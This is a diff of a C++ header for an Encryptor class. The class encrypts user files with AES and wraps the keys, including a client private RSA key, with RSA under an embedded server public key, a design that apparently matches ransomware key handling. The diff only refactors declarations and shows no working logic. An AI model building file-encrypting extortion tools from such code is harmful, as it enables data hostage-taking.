@@ -5,6 +5,7 @@
 #include <algorithm>
 
 #include "crypto/cryptoThread.h"
+#include "crypto/cryptoSecurity.h"
 #include "crypto/rsaEncryptor.h"
 #include "crypto/aesEncryptor.h"
 #include "crypto/serverPublicKey.h"
@@ -21,7 +22,7 @@ namespace hybrid
 /**
  * Class Encryptor to encrypt user files with AES. The CPrivateRSA and AESKeyPair(Key+IV) with RSA
  */
-class Encryptor : public CryptoThread
+class Encryptor : public CryptoThread, CryptoSecurity
 {
 
 private:
@@ -29,18 +30,6 @@ private:
 
     std::unique_ptr<rsa::RSAEncryptor> _rsaEncryptorAESKey, _rsaEncryptorCPrivateRSA;
     std::unique_ptr<aes::AESEncryptor> _aesEncryptor;
-
-    /**
-     * Saves the unencrypted AESKeyPair to the filesystem
-     *
-     * @param aesKeyPair: aesKeyPair string
-     */
-    static void saveUnencryptedAESKeyPair(const std::string &aesKeyPair);
-
-    /**
-     * Checks if bfly encryption files exists (CPrivateRSA.bin, AES.bin, RSA.bin)
-     */
-    static void checkIfEncryptionFilesExists();
 
 public:
 
